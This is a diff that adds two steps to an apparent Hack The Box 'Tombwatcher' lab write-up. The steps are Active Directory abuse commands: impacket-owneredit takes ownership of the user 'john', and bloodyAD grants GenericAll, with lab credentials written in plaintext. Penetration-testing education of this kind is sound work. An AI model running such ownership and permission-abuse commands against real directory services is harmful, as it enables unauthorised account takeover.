@@ -132,6 +132,17 @@ bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u 'ansible_dev$' -p ':XXXXXXXX
 
 ![BH_FPassChng](Pictures/htb_Tombwatcher_4b_sam_pass.png)
 
+Take over with WriteOwner:
+```
+impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'z0nHere' -dc-ip 10.10.11.72
+```
+
+GenericAll on John (using Sam):
+
+```
+bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'z0nHere' add genericAll john sam
+```
+
 ![Change_Pass](Pictures/htb_Tombwatcher_sam_pass_chnage.png)
 
 ```
